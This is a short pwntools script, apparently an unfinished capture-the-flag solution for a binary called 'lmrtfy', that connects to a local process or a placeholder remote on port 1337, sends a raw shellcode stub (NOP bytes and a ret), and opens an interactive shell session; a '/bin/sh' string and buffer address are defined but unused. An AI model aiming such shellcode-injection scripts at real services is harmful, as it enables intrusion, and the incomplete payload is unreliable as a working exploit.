#!/usr/bin/env python3

from pwn import *

exe = ELF("lmrtfy")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    r.recvline()

    nop = b'\x90' * 2
    buff_addr = p32(0xf7fc0000)
    bin_sh = b'/bin/sh\x00'
    ret = b'\xc3'
    r.sendline(nop + ret)

    r.interactive()


if __name__ == "__main__":
    main()
